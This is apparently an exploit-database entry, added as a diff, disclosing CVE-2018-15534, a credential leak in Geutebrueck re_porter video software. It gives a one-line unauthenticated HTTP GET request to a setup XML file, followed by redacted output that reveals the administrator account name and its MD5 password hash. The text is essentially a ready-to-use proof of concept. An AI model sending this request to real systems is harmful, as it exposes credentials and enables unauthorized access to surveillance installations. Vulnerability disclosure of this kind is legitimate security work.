@@ -1,0 +1,24 @@
+# Exploit Title: Geutebrueck re_porter 7.8.974.20 - Credential Disclosure
+# Date: 2018-08-03
+# Exploit Author: Kamil Suska
+# Vendor: https://www.geutebrueck.com/en_US.html
+# Link: https://www.sourcesecurity.com/geutebruck-re-porter-16-technical-details.html
+# Version: prior 7.8.974.20
+# CVE-2018-15534
+
+# PoC
+
+GET /statistics/gscsetup.xml HTTP/1.1
+Host: example.com:12003
+
+# Result (Redacted):
+
+<Node Name="UserList" NodeID="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
+      <Node Name="0000" NodeID="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
+        <Value Name="Name" ValueType="ntWideString" Value="Sysadmin"/>
+        <Value Name="Password" ValueType="ntString"
+Value="##MD5passwordhash##"/>
+        <Value Name="UserRights" ValueType="ntInt32" Value="0x00000001"/>
+        <Node Name="SecondUserList"
+NodeID="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
+        </Node>
